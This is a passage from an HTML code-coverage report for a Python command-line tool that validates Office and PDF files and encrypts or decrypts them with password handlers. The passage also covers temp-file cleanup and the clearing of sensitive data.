    <p class="run"><span class="n"><a id="t137" href="#t137">137</a></span><span class="t">    <span class="key">def</span> <span class="nam">_perform_security_and_file_validation</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="nam">List</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t138" href="#t138">138</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t139" href="#t139">139</a></span><span class="t"><span class="str">        Section B: Security &amp; File Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t140" href="#t140">140</a></span><span class="t"><span class="str">        Perform comprehensive security checks and file validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t141" href="#t141">141</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t142" href="#t142">142</a></span><span class="t">        <span class="key">from</span> <span class="nam">core</span><span class="op">.</span><span class="nam">security</span> <span class="key">import</span> <span class="nam">SecurityValidator</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t143" href="#t143">143</a></span><span class="t">        <span class="key">from</span> <span class="nam">core</span><span class="op">.</span><span class="nam">file_handler</span> <span class="key">import</span> <span class="nam">FileValidator</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t144" href="#t144">144</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t145" href="#t145">145</a></span><span class="t">        <span class="com"># B1a-B1c: Initialize and determine files to process</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t146" href="#t146">146</a></span><span class="t">        <span class="nam">security_validator</span> <span class="op">=</span> <span class="nam">SecurityValidator</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t147" href="#t147">147</a></span><span class="t">        <span class="nam">file_validator</span> <span class="op">=</span> <span class="nam">FileValidator</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">,</span> <span class="nam">self</span><span class="op">.</span><span class="nam">config</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t148" href="#t148">148</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t149" href="#t149">149</a></span><span class="t">        <span class="com"># Determine input files</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t150" href="#t150">150</a></span><span class="t">        <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">,</span> <span class="str">'input'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">.</span><span class="nam">input</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t151" href="#t151">151</a></span><span class="t">            <span class="nam">files_to_process</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">.</span><span class="nam">input</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t152" href="#t152">152</a></span><span class="t">        <span class="key">elif</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">,</span> <span class="str">'recursive'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">.</span><span class="nam">recursive</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t153" href="#t153">153</a></span><span class="t">            <span class="nam">files_to_process</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_collect_files_recursively</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">.</span><span class="nam">recursive</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t154" href="#t154">154</a></span><span class="t">        <span class="key">else</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t155" href="#t155">155</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="str">"No input files specified"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t156" href="#t156">156</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t157" href="#t157">157</a></span><span class="t">        <span class="nam">validated_files</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t158" href="#t158">158</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t159" href="#t159">159</a></span><span class="t">        <span class="com"># Process each file</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t160" href="#t160">160</a></span><span class="t">        <span class="key">for</span> <span class="nam">file_path</span> <span class="key">in</span> <span class="nam">files_to_process</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t161" href="#t161">161</a></span><span class="t">            <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t162" href="#t162">162</a></span><span class="t">                <span class="com"># B1e-B2e: Security validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t163" href="#t163">163</a></span><span class="t">                <span class="nam">security_validator</span><span class="op">.</span><span class="nam">validate_file_path</span><span class="op">(</span><span class="nam">file_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t164" href="#t164">164</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t165" href="#t165">165</a></span><span class="t">                <span class="com"># B3a-B5c: File format and content validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t166" href="#t166">166</a></span><span class="t">                <span class="nam">file_manifest</span> <span class="op">=</span> <span class="nam">file_validator</span><span class="op">.</span><span class="nam">validate_file</span><span class="op">(</span><span class="nam">file_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t167" href="#t167">167</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t168" href="#t168">168</a></span><span class="t">                <span class="nam">validated_files</span><span class="op">.</span><span class="nam">append</span><span class="op">(</span><span class="nam">file_manifest</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t169" href="#t169">169</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t170" href="#t170">170</a></span><span class="t">            <span class="key">except</span> <span class="op">(</span><span class="nam">SecurityViolationError</span><span class="op">,</span> <span class="nam">FileFormatError</span><span class="op">)</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t171" href="#t171">171</a></span><span class="t">                <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Validation failed for </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t172" href="#t172">172</a></span><span class="t">                <span class="com"># Continue with other files</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t173" href="#t173">173</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t174" href="#t174">174</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">validated_files</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t175" href="#t175">175</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="str">"No valid files found to process"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t176" href="#t176">176</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t177" href="#t177">177</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Validated </span><span class="op">{</span><span class="nam">len</span><span class="op">(</span><span class="nam">validated_files</span><span class="op">)</span><span class="op">}</span><span class="fst"> files for processing</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t178" href="#t178">178</a></span><span class="t">        <span class="key">return</span> <span class="nam">validated_files</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t179" href="#t179">179</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t180" href="#t180">180</a></span><span class="t">    <span class="key">def</span> <span class="nam">_collect_files_recursively</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">directory</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">List</span><span class="op">[</span><span class="nam">Path</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t181" href="#t181">181</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t182" href="#t182">182</a></span><span class="t"><span class="str">        B1c_Recursive: Collect Files Recursively</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t183" href="#t183">183</a></span><span class="t"><span class="str">        Walk directory tree for supported formats</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t184" href="#t184">184</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t185" href="#t185">185</a></span><span class="t">        <span class="nam">files</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t186" href="#t186">186</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t187" href="#t187">187</a></span><span class="t">            <span class="key">for</span> <span class="nam">pattern</span> <span class="key">in</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">.</span><span class="nam">keys</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t188" href="#t188">188</a></span><span class="t">                <span class="nam">files</span><span class="op">.</span><span class="nam">extend</span><span class="op">(</span><span class="nam">directory</span><span class="op">.</span><span class="nam">rglob</span><span class="op">(</span><span class="fst">f"</span><span class="fst">*</span><span class="op">{</span><span class="nam">pattern</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t189" href="#t189">189</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t190" href="#t190">190</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Error collecting files from </span><span class="op">{</span><span class="nam">directory</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t191" href="#t191">191</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t192" href="#t192">192</a></span><span class="t">        <span class="key">return</span> <span class="nam">files</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t193" href="#t193">193</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t194" href="#t194">194</a></span><span class="t">    <span class="key">def</span> <span class="nam">_setup_crypto_tools_and_configuration</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">validated_files</span><span class="op">:</span> <span class="nam">List</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Dict</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t195" href="#t195">195</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t196" href="#t196">196</a></span><span class="t"><span class="str">        Section C: Crypto Tool Setup &amp; Configuration</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t197" href="#t197">197</a></span><span class="t"><span class="str">        Initialize and configure crypto handlers</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t198" href="#t198">198</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t199" href="#t199">199</a></span><span class="t">        <span class="key">from</span> <span class="nam">core</span><span class="op">.</span><span class="nam">crypto_handlers</span><span class="op">.</span><span class="nam">office_handler</span> <span class="key">import</span> <span class="nam">OfficeDocumentHandler</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t200" href="#t200">200</a></span><span class="t">        <span class="key">from</span> <span class="nam">core</span><span class="op">.</span><span class="nam">crypto_handlers</span><span class="op">.</span><span class="nam">pdf_handler</span> <span class="key">import</span> <span class="nam">PDFHandler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t201" href="#t201">201</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t202" href="#t202">202</a></span><span class="t">        <span class="com"># C1a-C1d: Analyze required tools and initialize handlers</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t203" href="#t203">203</a></span><span class="t">        <span class="nam">required_tools</span> <span class="op">=</span> <span class="nam">set</span><span class="op">(</span><span class="nam">manifest</span><span class="op">.</span><span class="nam">crypto_tool</span> <span class="key">for</span> <span class="nam">manifest</span> <span class="key">in</span> <span class="nam">validated_files</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t204" href="#t204">204</a></span><span class="t">        <span class="nam">crypto_handlers</span> <span class="op">=</span> <span class="op">{</span><span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t205" href="#t205">205</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t206" href="#t206">206</a></span><span class="t">        <span class="key">if</span> <span class="str">'msoffcrypto'</span> <span class="key">in</span> <span class="nam">required_tools</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t207" href="#t207">207</a></span><span class="t">            <span class="nam">crypto_handlers</span><span class="op">[</span><span class="str">'msoffcrypto'</span><span class="op">]</span> <span class="op">=</span> <span class="nam">OfficeDocumentHandler</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t208" href="#t208">208</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t209" href="#t209">209</a></span><span class="t">        <span class="key">if</span> <span class="str">'PyPDF2'</span> <span class="key">in</span> <span class="nam">required_tools</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t210" href="#t210">210</a></span><span class="t">            <span class="nam">crypto_handlers</span><span class="op">[</span><span class="str">'PyPDF2'</span><span class="op">]</span> <span class="op">=</span> <span class="nam">PDFHandler</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t211" href="#t211">211</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t212" href="#t212">212</a></span><span class="t">        <span class="com"># C2a-C2b: Configure handlers</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t213" href="#t213">213</a></span><span class="t">        <span class="key">for</span> <span class="nam">handler</span> <span class="key">in</span> <span class="nam">crypto_handlers</span><span class="op">.</span><span class="nam">values</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t214" href="#t214">214</a></span><span class="t">            <span class="nam">handler</span><span class="op">.</span><span class="nam">configure</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">config</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t215" href="#t215">215</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t216" href="#t216">216</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Initialized </span><span class="op">{</span><span class="nam">len</span><span class="op">(</span><span class="nam">crypto_handlers</span><span class="op">)</span><span class="op">}</span><span class="fst"> crypto handlers</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t217" href="#t217">217</a></span><span class="t">        <span class="key">return</span> <span class="nam">crypto_handlers</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t218" href="#t218">218</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t219" href="#t219">219</a></span><span class="t">    <span class="key">def</span> <span class="nam">_process_files_with_crypto_operations</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">validated_files</span><span class="op">:</span> <span class="nam">List</span><span class="op">,</span> <span class="nam">crypto_handlers</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Dict</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t220" href="#t220">220</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t221" href="#t221">221</a></span><span class="t"><span class="str">        Section D: File Processing &amp; Operations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t222" href="#t222">222</a></span><span class="t"><span class="str">        Process files with crypto operations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t223" href="#t223">223</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t224" href="#t224">224</a></span><span class="t">        <span class="key">from</span> <span class="nam">core</span><span class="op">.</span><span class="nam">file_handler</span> <span class="key">import</span> <span class="nam">FileProcessor</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t225" href="#t225">225</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t226" href="#t226">226</a></span><span class="t">        <span class="nam">processor</span> <span class="op">=</span> <span class="nam">FileProcessor</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t227" href="#t227">227</a></span><span class="t">            <span class="nam">logger</span><span class="op">=</span><span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t228" href="#t228">228</a></span><span class="t">            <span class="nam">config</span><span class="op">=</span><span class="nam">self</span><span class="op">.</span><span class="nam">config</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t229" href="#t229">229</a></span><span class="t">            <span class="nam">password_manager</span><span class="op">=</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_manager</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t230" href="#t230">230</a></span><span class="t">            <span class="nam">crypto_handlers</span><span class="op">=</span><span class="nam">crypto_handlers</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t231" href="#t231">231</a></span><span class="t">            <span class="nam">temp_files_created</span><span class="op">=</span><span class="nam">self</span><span class="op">.</span><span class="nam">temp_files_created</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t232" href="#t232">232</a></span><span class="t">        <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t233" href="#t233">233</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t234" href="#t234">234</a></span><span class="t">        <span class="key">return</span> <span class="nam">processor</span><span class="op">.</span><span class="nam">process_files</span><span class="op">(</span><span class="nam">validated_files</span><span class="op">,</span> <span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">.</span><span class="nam">operation</span><span class="op">,</span> <span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">.</span><span class="nam">output_dir</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t235" href="#t235">235</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t236" href="#t236">236</a></span><span class="t">    <span class="key">def</span> <span class="nam">_cleanup_and_generate_final_report</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">processing_results</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">)</span> <span class="op">-></span> <span class="nam">int</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t237" href="#t237">237</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t238" href="#t238">238</a></span><span class="t"><span class="str">        Section E: Cleanup &amp; Results Reporting</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t239" href="#t239">239</a></span><span class="t"><span class="str">        Generate reports and determine exit code</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t240" href="#t240">240</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t241" href="#t241">241</a></span><span class="t">        <span class="key">from</span> <span class="nam">core</span><span class="op">.</span><span class="nam">file_handler</span> <span class="key">import</span> <span class="nam">ResultsReporter</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t242" href="#t242">242</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t243" href="#t243">243</a></span><span class="t">        <span class="com"># E1a-E1e: Calculate processing metrics</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t244" href="#t244">244</a></span><span class="t">        <span class="nam">reporter</span> <span class="op">=</span> <span class="nam">ResultsReporter</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">,</span> <span class="nam">self</span><span class="op">.</span><span class="nam">operation_start_time</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t245" href="#t245">245</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t246" href="#t246">246</a></span><span class="t">        <span class="com"># E2a-E2f: Enhanced cleanup</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t247" href="#t247">247</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">_perform_cleanup</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t248" href="#t248">248</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t249" href="#t249">249</a></span><span class="t">        <span class="com"># E3a-E3d: Sensitive data clearing</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t250" href="#t250">250</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">_clear_sensitive_data</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t251" href="#t251">251</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t252" href="#t252">252</a></span><span class="t">        <span class="com"># E4a-E5d: Report generation and exit code determination</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t253" href="#t253">253</a></span><span class="t">        <span class="key">return</span> <span class="nam">reporter</span><span class="op">.</span><span class="nam">generate_report</span><span class="op">(</span><span class="nam">processing_results</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t254" href="#t254">254</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t255" href="#t255">255</a></span><span class="t">    <span class="key">def</span> <span class="nam">_perform_cleanup</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t256" href="#t256">256</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t257" href="#t257">257</a></span><span class="t"><span class="str">        E2a-E2f: Enhanced Cleanup with Retry and Secure Deletion</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t258" href="#t258">258</a></span><span class="t"><span class="str">        Clean up temporary files and directories</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t259" href="#t259">259</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t260" href="#t260">260</a></span><span class="t">        <span class="key">for</span> <span class="nam">temp_file</span> <span class="key">in</span> <span class="nam">self</span><span class="op">.</span><span class="nam">temp_files_created</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t261" href="#t261">261</a></span><span class="t">            <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t262" href="#t262">262</a></span><span class="t">                <span class="key">if</span> <span class="nam">temp_file</span><span class="op">.</span><span class="nam">exists</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t263" href="#t263">263</a></span><span class="t">                    <span class="nam">temp_file</span><span class="op">.</span><span class="nam">unlink</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t264" href="#t264">264</a></span><span class="t">                    <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Cleaned up temp file: </span><span class="op">{</span><span class="nam">temp_file</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t265" href="#t265">265</a></span><span class="t">            <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t266" href="#t266">266</a></span><span class="t">                <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed to remove temp file </span><span class="op">{</span><span class="nam">temp_file</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t267" href="#t267">267</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t268" href="#t268">268</a></span><span class="t">    <span class="key">def</span> <span class="nam">_clear_sensitive_data</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t269" href="#t269">269</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t270" href="#t270">270</a></span><span class="t"><span class="str">        E3a-E3d: Enhanced Sensitive Data Clearing</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t271" href="#t271">271</a></span><span class="t"><span class="str">        Clear passwords and sensitive data from memory</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t272" href="#t272">272</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t273" href="#t273">273</a></span><span class="t">        <span class="com"># Clear password manager</span>&nbsp;</span><span class="r"></span></p>
